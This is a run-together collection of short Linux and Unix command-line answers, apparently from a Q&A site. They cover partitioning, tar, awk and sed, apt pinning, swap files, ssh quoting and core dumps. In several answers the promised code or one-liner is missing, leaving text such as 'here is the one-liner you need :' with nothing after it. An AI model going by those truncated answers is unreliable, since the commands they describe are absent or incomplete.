i use archlinux on all my machines . unfortunately , the archlinux installer is no longer as beginner friendly as it once was but installing arch or gentoo is a good learning experience . linux does not name partitions in terms of C:\, D:\, E:\ instead it will be /dev/sda1, /dev/sda2, /dev/sdb1 . note that *nix differentiates between partitions on the same drive vs physically separate drives . the letter x in /dev/sdX specifies the drive and the number # /dev/sda# specifies the partition . furthermore , the raw /dev/sdX# device nodes are separate from their mountpoints ( traditionally /media/&lt;label&gt; , with systemd now /run/media/&lt;user&gt;/&lt;label&gt; ) . however , for the current archlinux installer you will manually mount / ( root partition ; equivalent to windows C:\ ) to /mnt for the purposes of the installation . my recommendation is to first download the gparted livecd . this will help you make sense of your partitions and allow you to prepare them for the installer via a graphical ( gui ) means . you can only have 4 primary partitions using a traditional dos/mbr partition table , so you may choose to make the 4th partition extended and inside that create logical partitions . choose EXT4 for your archlinux partition . you should also create a SWAP partition ( 2gb recommended ; equivalent to windows pagefile or hiberfil.sys ) for hibernation and virtual/overflow ram support . i do not think you will need a separate /boot partition . additionally , i strongly recommend that you choose the grub2 bootloader . it offers a lot of features ( such as iso booting ) and works basically " out of the box " with archlinux . you can generate a config file using os-prober and grub-mkconfig that will create a boot entry for windows . some of that stuff on wiki is regarding uefi or alternative boot methods which should not concern you . best of luck !
globs are not regular expressions . in general , the shell will try to interpret anything you type on the command line that you do not quote as a glob . shells are not required to support regular expressions at all ( although in reality many of the fancier more modern ones do , e.g. the =~ regex match operator in the bash [[ construct ) . the .??* is a glob . it matches any file name that begins with a literal dot . , followed by any two ( not necessarily the same ) characters , ?? , followed by the regular expression equivalent of [^/]* , i.e. 0 or more characters that are not / or the null character , '\0' . for the full details of shell pathname expansion ( the full name for " globbing" ) , see the posix spec .
zstyle -L lists all the styles that have been defined , with their values . for a slightly nicer display with only the patterns , you can use zstyle-list-patterns () { local tmp zstyle -g tmp print -rl -- "${(@o)tmp}" }  this is a far cry from your goal of listing all the styles that you can configure . for one thing , styles can be based on wildcards , which can be instantiated in infinitely many ways ( for example , completion settings can be set per command ) . there is no declaration of styles : a function that can be configured through a style calls the zstyle command to look up some value , possibly with variable arguments . it is impossible to anticipate what arguments are going to be passed to zstyle in the future . all you can do is consult the documentation of the function ( when it exists ) or its source code .
this should work : the reason your advice did not work is that it was " after " advice , meaning it did not run until after the normal kill-buffer logic had completed . ( that is the after in (after avoid-message-buffer-in-next-buffer) . around advice let 's you put custom logic either before or after the advised command and even control whether it runs at all . the ad-do-it symbol is what tells it if and when to run the normal kill-buffer routine . edit : having re-read your question i think i may have misunderstood it . if you are looking to skip a special buffer that would have been displayed after killing a buffer then your approach is basically correct . have you activated the advice ? you can either evaluate (ad-activate 'avoid-messages-buffer-in-next-buffer) or include activate at the end of the argument list to defadvice as i did in my example .
just quote the directory . i use rmdir just to ensure you do not accidently delete your home directory . rmdir "~"  for your other question ( better to create a extra question for it ) total means the total file size of the directory ( sum of the file sizes in the output ) . if you use -h it will show you the size in a human readable format . ls -lh
with gnu tar , you can do : pigz -d &lt; file.tgz | tar --delete --wildcards -f - '*/prefix*.jpg' | pigz &gt; newfile.tgz  ( pigz being the multi-threaded version of gzip ) . you could overwrite the file over itself like : but that is quite risky , especially if the result ends up being less compressed than the original file ( in which case , the second pigz may end up overwriting areas of the file which the first one has not read yet ) .
the most comfortable solution for such task is awk: df -h /dev/sda2 | awk 'NR==2{print$4}'  or if more partitions are listed , you can pick the right line by the mount point : df -h | awk '$1=="/dev/sda2"{print$4}'  is also simple with sed , but less nice if you need to debug it a few mounts later : df -h /dev/sda2 | sed -rn '2s/^((\S+)\s+){4}.*/\2/p' df -h | sed -rn '/^\/dev\/sda2/s/^((\S+)\s+){4}.*/\2/p'  that supposes gnu sed . posix compatible syntax includes many escaping : df -h /dev/sda2 | sed -n '2s/^\(\(\S\+\)\s\+\)\{4\}.*/\2/p' df -h | sed -n '/^\/dev\/sda2/s/^\(\(\S\+\)\s\+\)\{4\}.*/\2/p' 
the error message is because it is asking a yes/no question , and "1" is not yes or no . do not use parted 's mkfs command : it is incomplete ( does not even support ntfs ) , broken , and was removed from parted upstream several releases/years ago beacuse of this . use mkntfs instead .
i had a detailed look into the udisks2 source code and found the solution there . the devices correctly mounted under user permissions were formatted with old filesystems , like fat . these accept uid= and gid= mount options to set the owner . udisks automatically sets these options to user and group id of the user that issued the mount request . modern filesystems , like the ext series , do not have such options but instead remember owner and mode of the root node . so chown auser /run/media/auser/[some id] indeed works persistently . an alternative is passing -E root_user to mkfs.ext4 which initializes uid and gid of the newly created filesystem to its creator .
it is fine to install , and mixing stable/testing is usually fine -- that is what dependencies are for , to make sure that everything gets the versions they need . gilles is incorrect : testing does get security updates . see " how is security handled for testing ? " in the debian faq for details . you may need to adjust things like the unattended-upgrades configuration if you want them installed automatically . however , your /etc/apt/preferences will cause problems with a mixed stable/testing system , because you have set the priorities way too high . read the apt_preferences(5) man page carefully , particularly under " apt 's default priority assignments " . basically , setting Pin-Priority: 1001 for stable is saying " install the version from stable , even if it is a downgrade of a package that was installed from testing" . downgrading is generally an unsupported operation in apt , but even worse , this means that any time you try to install a newer version of a package like libc from testing , you will constantly be running against problems where apt is trying its hardest to reinstall the old version . that will quickly lead to the " conflicts and missing dependencies " that gilles referred to . on a properly configured system mixing distributions is fine . the numbers you actually want to use are closer to : the key is that stable should be set between 100-500 , and testing should be between 1 and 100 .
is this not how to set up a swap file ? i think you missed a step in between chmod and swapon: mkswap /mnt/sda2/swapfile  as for the oxymoromic error . . . swapon : /mnt/sda2/swapfile : read swap header failed : success what this literally means is there is a bug in the swapon code , but not necessarily one related to its primary functioning . c library functions often make use of errno , a global variable that stores an error code . the function itself will return a value indicating an error occurred ( any error ) , and the exact nature of that error will be stored in errno . the idea is that if you get an indication of an error , you can then check the value of errno to see exactly what it is . there is also a strerror() library function that will take an errno value ( they are integers ) and return a human language string relating to it . one of those is Success , which corresponds to an error code of 0 ( i.e. . , no error ) . so when you see something like this , it indicates a mistake such as : getting an error , then calling another function ( successfully ) which resets errno to 0 behind the scenes , then using errno to determine the specifics of the error you got before you called the second function . and/or passing strerror() a variable that was supposed to have been assigned the value of errno at some point ( to prevent the previous mistake from happening ) but was not .
'~' is expanded by the shell . do not use '~' with -c : tar czf ~/files/wp/my-page-order.tar.gz \ -C ~ \ webapps/zers/wp-content/plugins/my-page-order  ( tar will include webapps/zers/wp-content/plugins/my-page-order path ) or tar czf ~/files/wp/my-page-order.tar.gz \ -C ~/webapps/zers/wp-content/plugins \ my-page-order  ( tar will include my-page-order path ) or just cd first . . . . cd ~/webapps/zers/wp-content/plugins tar czf ~/files/wp/my-page-order.tar.gz my-page-order 
display settings did you check under System-Settings -&gt; Displays ( the names might be slightly different ) ? the screen resolution may have changed to one that is not the same aspect ratio as your monitor . this setting is per user , which is why your login screen looks fine . test user create a test user ( as root ) :- #useradd -m testuser #passwd testuser  log out and log in as this new user and check the screen resolution . if it is good , then the issue is a configuration within your user account .
if you want to push the freedom exigence as far as possible , you would also want a coreboot , u-boot or pmon bios . the best ( only ? ) option , in this case , is rms 's laptop : a lemote yeeloong , using pmon . it is however rather small ( either 8.9'' or 10'' ) and underpowered , but very cheap . check out " lemote linux pc and linux laptops " when it comes to choosing a video card , go intel . a free ( as in freedom ) driver and firmware and you will have 3d acceleration .
look inside the tar file : tar ztvf OEM.tar.gz  maybe " they " have put the iso and some readmes in that archive . if so , extract the whole archive by typing : tar zxf OEM.tar.gz  i think there will be some readme file with instructions about how to burn or how to put it on a pendrive . . .
this is not possible . i dug through the source code and you can force a line break ( ctrl+v , ctrl+m ) , but this actually messes up the display . the event stays on the same line but the line break starts over at the beginning and overwrites the characters . given the following two examples : 00000325 Popeye statue unveiled, Crystal City TX Spinach Festival, 1937 outputs Wed 26 Mar 2014 - Tomorrow * History: Popeye statue unveiled, Crystal City TX Spinach Festival, 1937  while 00000326 Popeye statue unveiled, Crystal City ^MTX Spinach Festival, 1937 outputs Wed 26 Mar 2014 - Tomorrow TX Spinach Festival, 1937unveiled, Crystal City 
as discussed in the comments , it seems like the problem was the vpn gateway wrongly sending icmp redirects to the app server because setting the sysctl settings net.ipv4.conf.all.send_redirects and/or net.ipv4.conf.eth0.send_redirects to 0 appears to have solved the problem . i do not know why the vpn gateway would tell the app server to go via the outer gateway which the app server can not possibly reach without going through the vpn server .
in bash , you can use process substitution with tee : tee &gt;(grep XXX &gt; err.log) | grep -v XXX &gt; all.log  this will put all lines matching xxx into err.log , and all lines into all.log . &gt;( ... ) creates the process in the parentheses and connects its standard output to a pipe . this works in zsh and other modern shells too . you can also use the pee command from moreutils : pee "grep XXX &gt; err.log" "grep -v XXX &gt; all.log"  pee redirects standard input to multiple commands ( "tee for pipes" ) . a further alternative is with awk : awk '{ if (/^([0-9]{1,3}\.){3}[0-9]{1,3}/) { print &gt; "err.log" } else { print &gt; "all.log" } }'  that just tests every line against the expression and writes the whole thing into err.log if it matches and all.log if it does not . the awk regular expression is suitable for grep -E too ( although it does match some bad addresses — 999.0.0.0 and so on — but that probably is not a problem ) .
all you need is printf. it is the print function - that is its job . printf '%s\t%s\\n' ${array[@]}  you do it like this : ( set -- 12345 56789 98765; for i ; do eval set -- $(printf '"$%s" ' `seq 2 $#` 1) echo "$*" done )  output 56789 98765 12345 98765 12345 56789 12345 56789 98765  i did not need eval - that was dumb . here 's a better one : output 56789 98765 12345 98765 12345 56789 12345 56789 98765  and then if you want only two elements you just change it a little bit - one more line : output 56789 98765 12345 98765 12345 56789  i do this all of the time , but never the bashisms . i always work with the real shell array so it took a few minutes to get hold of it . here 's a little script i wrote for another answer : this writes to 26 files . they look like this only they increment per file :
there can not be commands that set variables of your shell , because variables are something internal to the shell process , so another command , living in its own process , could not possibly alter that . with your shell , you can do things like : var=$(some-command)  to retrieve the output of a command ( without the trailing newline characters ) , but if you need two outcomes of a command , that is when it becomes trickier . one method is like : eval "$(some-command)"  where some-command outputs things like : var1='something' var2='someotherthing'  but before you ask , there is no such standard command that takes a path and splits it into the dir , basename and extension ( whatever that means ) in such a way . now the shells themselves may have internal features for that . for instance csh and zsh have modifiers that can give you the head , tail , extension . like in zsh: file=/path/to/foo.bar/ head=$file:h tail=$file:t ext=$file:e rest=$file:r  now you may want to consider what those should be for a file like . or .. , / , .bashrc or foo.tar.gz ? now if you are looking for standard posix syntax , then you have it already ( almost ) : rest=${file%.*} . ${file#$rest} is zsh specific . in posix syntax , you need ext=${file#"$rest"} , otherwise $rest is taken as a pattern . beware that may not do what you want if $file contains a path with / characters ( like foo.d/bar ) .
these are so-called core dumps . some signals ' default handler besides killing the receiver of the signal is writing out the memory contents and process state at the time of death for post-mortem analysis . unless you are planning to dissect those files you can safely remove them . you could also inhibit the creation of core dumps by setting the appropriate resource limit to 0 ( this is done by setting the core item in /etc/security/limits.conf to 0 ) . you should note that the fact that your system creates those files rather rapidly should alarm you that there is something not going too well because some process regularly dies in a non-intended way . this could be caused by a buggy ( automatically respawning ) program or be caused by more serious problems like memory defect . you might want to look into your log files and dmesg output to get a hold on that .
try : ssh host 'something &gt; file'  here 's a contrived demonstration of a way to handle redirection , pipes and quotes : ssh host date -d yesterday \| awk "'{print $1}'" \&gt; 'file" "with\ spaces.out'  the pipe and redirection are escaped rather than being contained in an overall outer set of quotes , reducing the need to escape one level of quotes . the single quotes for the awk command are protected by the double quotes that surround them . the filename could be protected in the same way , but here i show how the single quotes protect the double quotes and the escape .
they do essentially the same thing . you are seeing a file size difference because echo includes a newline at the end , which takes up a byte . you can stop it with -n , so echo -n "" &gt; logfile will result in a 0-byte file
the easy answer is to define a macro which gets substituted into both locations . %define my_common_requires package-1, package-2, package-3 BuildRequires: %{my_common_requires} Requires: %{my_common_requires}  this also lets you manually define something that needs to be in one of the two lines but not both .
tools is there any way to find out , what is the incoming and outgoing bandwidth usage of each hop ( for a particular port . ) ? unless you own the network element , or your third-party wan provider discloses the information , you can only estimate end-to-end available ingress and egress bandwidth along a network path . see below . is there exist any tool/utility/application who can serve the purpose . for path " available bandwidth estimation " that i mentioned above , you should review sally floyd 's archive of end-to-end tcp/ip bandwidth estimation tools . i am most familiar with yaz , which is based on unicast udp packets . to see whether you are dropping packets at any given router hop ( which is your bottom-line problem ) , you can use mtr ; there is also a win-mtr client , which supports windows . to see a simple example of how i typically troubleshoot packet drops , see my answer on superuser . this technique is most effective at providing visibility to packet drops at the first point where they happen ( since mtr does not give much visibility to downstream drops beyond that point until you correct the first ) . a simple technique to get a rough estimate of where your drops are is to install mtr on your server and then run an mtr session to trace packet loss to a single multicast client while you are transferring your 100m file . for more precise measurements you could use iperf to saturate the network instead of your 100m file ( as long as you coordinate wan downtime appropriately with other groups in the company ) . diagram the rest of my answer is going to use the following diagram for reference : in the diagram : r1 through r5 are ip routers s1 and s5 are ethernet switches the blue server on 172.16.1.0/24 represents your multicast server . c51 through c55 are examples of multicast receivers ( could be any number of receivers ) the specifics of the wan between r1 and r5 usually will not matter much , we just need a baseline topology so we are on the same page . from what i can tell , you are saying that r1 's interface on 172.16.1.0/24 shows about 9mbps while you are sending the 100mb file and r5 's interface on 172.16.5.0/24 shows about 4.2mbps when clients are receiving via reliable udp multicast . when you say reliable , i assume that means there is some kind of packet sequencing built into the multicast service , and the client application knows how to request a retransmission from the server . diagnosis if this description is correct , there are a few likely causes : link congestion somewhere after r1 , as you asserted in your question . performance limitations of any rx device in the path , including r1 and r5 ( such as hitting a multicast replication performance limit ) you are hitting a throughput limitation of 10m half-duplex ethernet . causes 1 or 2 would be revealed by using mtr . however , cause 3 is worthy of a bit more discussion . 10m/half links provide a maximum of 10mbps for a unidirectional transfer . if you are sending bi-directional traffic on a 10m/half link , you will typically see substantially less than 10mbps because of ethernet 's csma/cd dynamics . on a half-duplex link , ethernet cannot simultaneously transmit and receive ; if stations try to do this , their frames will collide , and both stations will delay retransmission for a random time . i test networks for a living . when i have tested effective bi-directional throughput of 10m/half links , i generally see between 3mbps and 4mbps . the numbers you are sharing above sound very similar . i do not have enough evidence to make an accusation , but i would not be surprised if your 10m/half links are the problem ; particularly if the link between r5 and s5 is 10m/half .
no , there is no special iso for that , its the same one . if you have hardware raid use it to make one drive and follow by booting as regular centos installation .
your system should have gnu grep , that has an option -P to use perl expressions and you can use that , combined with -c ( so no need for wc -l ) : grep -Pvc '\S' somefile  the '\S' hands the pattern \S to grep and matches all line containing anything that is not space , -v selects all the other lines ( those only with space ) , and -c counts them . from the man page for grep :
if those filenames do not contain newlines and are one per line in the text file you can do : cat file_with_filenames | xargs grep -F '50=MSFT'  ( you can include the double quotes if they are part of the search string ) .
in general , you can use open from the terminal to open any file with its default application ( see this so question ) . open is mac os-specific . on gnu/linux , the equivalent is usually xdg-open . also , for your reference , you can try to find out what type of file a file really is ( regardless of its extension ) using the file command .
xargs one method that i am aware of is to use xargs to find this information out . getconf the limit that xargs is displaying derives from this system configuration value . $ getconf ARG_MAX 2097152  values such as these are typically " hard coded " on a system . see man sysconf for more on these types of values . i believe these types of values are accessible inside a c application , for example : #include &lt;unistd.h&gt; ... printf("%ld\\n", sysconf(_SC_ARG_MAX));  references arg_max , maximum length of arguments for a new process
see those numbers on the left of the output ? you can use them to refer to that command with shell history expansion ; ![number] in most shells . this works both in bash and zsh: $ echo "hello" hello $ history | grep hello 5057 echo "hello" $ !5057 echo "hello" hello $ 
a one-liner to parse amixer 's output for volume in a status bar : awk -F"[][]" '/dB/ { print $2 }' &lt;(amixer sget Master)
\1 will give you everything listed in your group ( the \( \) section ) . your group includes the spaces , so the zero will be put in , then the " 2 " will be added . to fix , change to sed -e 's/ \([0-9]\) / 0\1 /'  example before $ cat sample.txt | sed -e 's/\( [0-9] \)/0\1/' Sep0 2 03:03:25 XX:XX:XX:XX:XX:XX  after $ cat sample.txt | sed -e 's/ \([0-9]\) / 0\1 /' Sep 02 03:03:25 XX:XX:XX:XX:XX:XX 
in the ccmake step there are two python related paths : the header files : PYTHON_INCLUDE_PATH (with me pointing to: /usr/include/python2.7)  and the libs : PYTHON_LIBRARY (with me pointing to: /usr/lib/x86_64-linux-gnu/libpython2.7.so)  of course pick the right paths in your own situation .
gemalto drivers are now open source i believe . they have the source code on their website . you will need to configure the pam module ( i am not sure how to do this , but the code is certainly there ) . i imagine the pam configuration would require a mapping of a certificate principle to a local user id . gdm i believe supports smart cards now , but i am not sure how it detects it . i will try to look this up later ( easiest way is probably to just peek at the gdm source code ) . of course this all requires pcscd and libpcsclite to be installed . you will also need to copy the libgtop11dotnet.so to /usr/lib .
probably not . if the oom killer is running then it is likely that the oom killer needs to be run to avoid the machine simple grinding to a halt as nothing , even the kernel , can allocate new memory if needed . the oom killer exists because it is generally better to have some services fall over due to the killer than the whole machine to fall off the face of the ' net . if you see the oom killer in action with any regularity then you should either reconfigure the services on the machine to use less ram , or you may need to add more ram to the machine .
now that you once again have access , check the log to determine what , if any , clues there are as to why you were blocked . <code> tail -n300 /var/log/auth . log | grep ssh 1 </code> the other thing to remember is that , if it happens again , you can run ssh in verbose mode with the -vvv option , which will return more detailed diagnostic information . from man ssh: -v &nbsp ; &nbsp ; verbose mode . causes ssh to print debugging messages about its progress . this is helpful in debugging connection , authentication , and configuration problems . multiple -v options increase the verbosity . the maximum is 3 . [ 1 ] you may need to increase/decrease the amount you tail by ( -n ) to identify the relevant entries .
why bother with a complicated set-up on a workstation ? one partition sized 20gb ( or 30gb if you plan to build the world from sources ) should be plenty for / and the rest should go to /home . i was going to recommend ext4 , but realised you are not using linux . why not just use whatever is available as default . change this only if you have special needs .
the &amp; only applies to the preceeding selector , so you will need one for each of those :msg lines . http://www.rsyslog.com/doc/rsyslog_conf_actions.html
skipping releases is not allowed . besides , f16 is eol . backup and perform a clean install . what you are trying to do is unsupported , sorry .
because , if you mount the ext3 in writable mode , there are a few things that get updated , like the last mount date . try if this also happens when you mount with -o ro .
if you are just looking to find the line ( to jog your memory ) you could just grep for the part of the command you remember : history | grep "substring"
what you wrote makes no sense : /dev/example is a file , not a program or a pipe . if you write data to a device , it does not go through the device and out to another program . for example , data written to /dev/audio is played on loudspeakers . if you read data from /dev/audio , you get data recorded on the microphone . there is no relationship between what is played on the loudspeakers and what is recorded with the microphone .
one other option to suggest . fsarchiver does a good job of restoring file systems to a different size partition or even a different file system type . you could make a backup of your master fsarchiver savefs /path2storage/master.fsa /dev/sda1 /dev/sda2 /dev/sda3  the previous example uses three partitions , /boot / and /home . partition new disk to size and restore master . fsa fsarchiver restfs /path2storage/master.fsa id=0,dest=/dev/sdb1 id=1,dest=/dev/sdb2 id=2,dest=/dev/sdb3  obviously you need to substitute the appropriate devices after restoring an fsarchive one would need to update the target /etc/fstab and install a bootloader from chroot . fsarchiver -h shows examples of converting filesystem type
provided you have GNU awk here is the one-liner you need :
additionally you can authenticate by usb device ( including one time pads and any mix with other pam modules of course ) . as tante said you can also store keys to harddrive on usb device .
an environment variable is one that is exported to subprocesses . this script , yet to adapt to your need , could be of help . it uses the ${var:?word} syntax , with and without : to determine the result :
some notes on your question , maybe it helps , hopefully : ~/.xinitrc is not the right place for these settings , see for example here , in the " archwiki " do not fight your distribution , archlinux 's system startup is configured via /etc/rc.conf , which is pretty neat . this includes the network configuration , see again the archwiki for details , especially the part on dhcp ip . try to setup networking in the way it is described there and if this fails , it would be good to have more information on the failure ( logs , details about how it was configured ) . as you can see , the archwiki is a valuable resource : by the way , the eht1 is just a typo , right ? oh , another reason for using the distribution-specific way to configure networking , you can simply use /etc/rc.d/network restart to reconfigure ( as root ) , so there should be no need to reboot .
if i understand correctly , you just need to su from root to some other user . try copying an su binary ( it will not need to be setuid root ) , but i do not know if that will work on solaris . or compile a small c program that drops privileges and executes a command . here 's a small “down-only” su . minimally tested . should compile as is under solaris and *bsd ; you need to -D_BDS_SOURCE and #include &lt;grp.h&gt; under linux , and other platforms may require commenting out the call to the common but non-standard setgroups . run as e.g. sugexec UID GID bash /path/to/script ( you must pass numerical user and group ids , to avoid depending on any form of user database that may not be available in the chroot ) .
yes , using grub2 you can do this : it has been patched to support not only aes , twofish , serpent and cast5 encryption , but a number of hashing routines such as sha1 , sha256 , sha512 , and ripemd160 . there is also support for the luks on-disk encryption format . check out this xercestech post for a full manual walkthrough , but in a nutshell everything is encrypted except for the actual bootloader , which you could have on a usb stick if you really wanted to stay safe . the luks patches to support grub are here .
it looks like your system has kexec enabled . kexec allows the linux kernel to load another kernel and hand the system over to that system . it is named after the exec family of functions that replace a process by a new executable image . instead of calling the reboot utility , your system is set up to call kexec when you reboot , and the kernel does the rest .
the convention changes depending on what you are looking at ; hd0,0 looks similar to grub , while sd0 is similar to entries in /dev , but neither matches what i normally see . in /dev: ide drives start with hd , while sata ( and i believe any kind of serial device ) start with sd drives are lettered starting with a in cable order , so /dev/sda is the first serial drive , and /dev/hdb is the second ide drive partitions on a drive are numbered starting with 1 , so /dev/sdb1 is the first partition on the second serial drive grub 1 does not have the distinction between drive types , it is always of the form (hdX, Y): X is the number of the drive , starting with 0 , so sda is hd0 , sdb is hd1 , etc . Y is the number of the partition , starting with 0 ( not 1 like /dev ) , so sda1 is (hd0, 0) i believe grub 2 uses a different syntax , but i do not know it it is significant when you are installing multiple oses if you want to put them on separate partitions -- you need to keep track of which os is where . it is really significant anytime you are dealing with unmounted drives ; you need to know that / is on /dev/sda1 and /home is on /dev/sda2 ( for example ) as far as i know , windows disks start from disk 0 , and partitions do not have any particular numbering . drive letters are assigned however you like and not tied to a particular partition
from the documentation : /dev/tty Current TTY device /dev/console System console /dev/tty0 Current virtual console  in the good old days /dev/console was system administrator console . and ttys were users ' serial devices attached to a server . now /dev/console and /dev/tty0 represent current display and usually are the same . you can override it for example by adding console=ttyS0 to grub.conf . after that your /dev/tty0 is a monitor and /dev/console is /dev/ttyS0 . an exercise to show the difference between /dev/tty and /dev/tty0: switch to the 2nd console by pressing ctrl + alt + f2 . login as root . type sleep 5; echo tty0 &gt; /dev/tty0 . press enter and switch to the 3rd console by pressing alt + f3 . now switch back to the 2nd console by pressing alt + f2 . type sleep 5; echo tty &gt; /dev/tty , press enter and switch to the 3rd console . you can see that tty is the console where process starts , and tty0 is a always current console .
easiest way is to toggle to file name only mode and regex mode , from docs : once inside the prompt : ctrl + d : toggle between full-path search and filename only search . note : in filename mode , the prompt 's base is &gt;d&gt; instead of &gt;&gt;&gt; ctrl + r : toggle between the string mode and full regexp mode . note : in full regexp mode , the prompt 's base is r&gt;&gt; instead of &gt;&gt;&gt;
unlike other systems , where the " developer makes available , people use " deployment strategy is used ( windows , i am looking at you ) , with unix-like distros , there is usually a package manager and some team managing its packages . the main point is so that everything works well together . at least when i used windows , the usual thing was that a program would update dlls if it had newer versions to install , but nothing ever controlled whether everything would work well with the new version of the library , you are just adding more files to the jungle , if anything breaks , it can break badly . with package management , new versions are ( or should be ) tested before being made available , so that you do not have downstream issues . the problem you may have with non-distro packages is that they may have not been really tested for your distro , or may lack dependencies or restrictions in the metadata . this is about packages . if you are going to install from a developer instead of waiting for your distro to release their package , go for packages . as far as you stay with the package manager , you do not risk making a mess out of your system . if you decide to compile from sources or simply unpack a tarball , think twice before doing a make install to the /: you may overwrite files or add files which the package manager is not tracking , and this may break your system , by installing incompatible files , by changing settings in a way you can not undo by removing the package using a package manager , etc . . this is also the reason why you never want to use developer-provided install scripts ( nvidia drivers . . . ) . think of this like entropy : package managers do actually keep track of it , so it can violate the second law of thermodynamics if need be . when you use a third-party install script or just make install , you are increasing the entropy of your system without keeping track of it . once you have done that , your only chance to make sure you remove anything you added is to restore a backup or to reinstall the system . tl ; dr : you are bypassing distribution-level testing , which tries to catch issues specific to the software distributed in the same distribution . you are bypassing the package manager , possibly leading your system to an unrecoverable state , if anything goes wrong . in the end , like @jordanm said , weight the pros and cons . if possible , look for third-party packages for your package manager that , at least , will help you with the second bullet above .
i agree with @don_crissti that this is most likely being caused by the colormanager interface , ( i.e. . org . freedesktop . colormanager ) . if you are not familiar with icc profiles they are profiles which describe a particular device 's color attributes , you printer in this case . you can read more about icc profiles here on wikipedia , or color management in general . so usually there is software that comes with the printer that will allow you to create your own profiles or use stock ones that come with the device . cups , colormanager in this case , is complaining because it can not find these profiles . now is where my knowledge on the subject starts to really drop off , so i have to revert to my hacking skills . if you look for " icc " on your system , using say the locate command , you will find some files which are color profiles : these profiles are not necessarily for just printers , any input or output device can use them ( scanners , monitors , etc . ) . the above are just some examples to show you what is going on . if you poke around under the preferences dialog of your printer you will probably see something like this : $ system-config-printer  select a printer that features color printing and right click on it and select properties &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; select " printer options " you will see the color modes that are available &nbsp ; &nbsp ; &nbsp ; &nbsp ; so why the error message ? so what is most likely happening is that the print driver you have selected for this printer is looking for . icm files that either the printer does not offer by default or the files are not present on your system . typically when i have encountered this error i have switches to a different driver from the same manufacturer or used some generic drivers but each situation is different so it is hard to give specifics . references where does gnome color manager store the icm or icc files ?
the kde application KRuler should fit the bill . to start KRuler , choose Graphics-&gt;KDE Screen Ruler from your k menu . the rotation buttons allow you to change it is orientation in steps of 90 degrees , or you can click your middle mouse button ( if you have one ) to change it to a vertical ruler .
look , your cpu family cpu family : 6 , which matches the description in CONFIG_MCORE2: Newer ones have 6 and older ones 15 that is the right config to choose . and your memory issue , as you disabled highmem , your kernel can only use 896m memory space .
if still want access to a nice package repository , i would consider something like crunchbang linux . it is an ubuntu fork so it can use traditional repos with apt-get . i have been running crunchbang ( # ! ) for some time now on an older eeepc model with 1gb ram and its nice and smooth . here is a list of the software # ! comes with ( stable version ) . of course , it would not be too hard to just remove a couple of them right after installation . i would also recommend using a window manager such as dwm . it would help you maximize your laptop 's screen size ( i even use it on my dual-screen desktop setup ) and keep visuals to a minimum . of course , this sort of jump from gnome or kde is not for everyone . it is easy to install/implement and the learning curve really as bad as they say .
i do not know what the defaults are for cygwin 's ssh . exe , but for openssh the default is to not enable x11 forwarding . that default can be overridden by modifying the ssh client 's config file ( e . g . ~/ . ssh/config on a unix/linux box ) or by using the -X option on the ssh command line - e.g. ssh -X remotehost gimp might be worthwhile checking whether cygwin ssh . exe has the same default and/or the same or similar option . btw , what happens when you ssh to the mint box and then run gimp from the command line ? if it does not work , try again with -X . finally , you may want to try putty as your ssh client on the windows box .
there is no complete documentation for hp-info command . all that you can find is in hp-info - -help ( or ) man hp-info command . hplip is a open source project and you can find the complete source code of hplip @ http://hplipopensource.com/hplip-web/gethplip.html . you can explore through the source code to get more info on the data listed by hp-info command . most of it is contained in codes . py and models . dat file of the source . source
check your path . it is not that hard to end up with duplicates in it . example : \xbbecho $PATH /usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin: \xbbwhich -a bash /bin/bash /usr/bin/bash  this is because my /bin is a symlink to /usr/bin . now : since /usr/bin is now in my $path twice , which -a finds the same bash twice .
if you have a list of file you can use something like : cat list-of-files.txt | while read file; do ffmpeg -i $file -codec copy ${file%%.mp4}.avi; done  or simply cd /path/; ls *.mp4 | while read file; do ffmpeg -i $file -codec copy ${file%%.mp4}.avi; done 
your cpu is a dual core cpu with hyperthreading intel® core™ i5-460m processor this means you have 2 cores and they are physical cpu 's . you have also hyperthreading and so you have 4 logical cpu 's . taskset was designed because the balancing of tasks in a multicore cpu was a performance lost . the tasks did normally not use hyperthreading and cpu 's had only separate caches . you have a hyperthreading cpu so you will never know which physical cpu is in use and the balancing of tasks normally does not result in a performance lost because they use the same cache . intel 's smart ( unified ) cache seems to make taskset obsolete . however using taskset in a numa system makes still sense . a benchmark can answer if you can increase performance using taskset here .
the memory of a setuid program might ( is likely to , even ) contain confidential data . so the core dump would have to be readable by root only . if the core dump is owned by root , i do not see an obvious security hole , though the kernel would have to be careful not to overwrite an existing file . linux disables core dumps for setxid programs . to enable them , you need to do at least the following ( i have not checked that this is sufficient ) : enable setuid core dumps in general by setting the fs.suid_dumpable sysctl to 2 , e.g. with echo 2 &gt;/proc/sys/fs/suid_dumpable . ( note : 2 , not 1 ; 1 means “i am debugging the system as a whole and want to remove all security” . ) call prctl(PR_SET_DUMPABLE, 1) from the program .
make the source your system root SOURCE="/" and then create an exclude file at : ~/conf/&lt;backupprofile&gt;/exclude  at this article there is a good example of exclude file : http://aguslr.github.com/blog/2012/04/18/backups-with-duply/ also , you should not backup /dev , /proc and other system folders in a unix system . just add them to the exclude file . if you mean multiple remote directories , you must create a profile for each machine : duply server1 backup duply server2 backup 
the kernel does not have a filesystem to write to during most of boot , so if the boot failed , you may be out of luck . however , it does keep a log in memory ( including what you see on the console ) and once it does have a rw fs , that stuff is dumped into /var/log/syslog . you can also view the kernel log starting from the beginning with dmesg ( probably you want to use dmesg | less ) . however , i do not think the kernel uses colored emphasis ( in any case , the color itself will not be in a log ) , implying this is a system service . some of those also start before a rw filesystem is available , and if that is the case , there may be no record of the message at all . otherwise their stuff should also be in /var/log/syslog . you can also try scroll lock , or ctrl-s ( pause ) ctrl-q ( continue ) during boot . there is also a " boot_delay " parameter that can be put on the kernel command-line ( e . g . in grub . conf ) . from src/documentation/kernel-parameters . txt : hopefully at least one of these works for you .
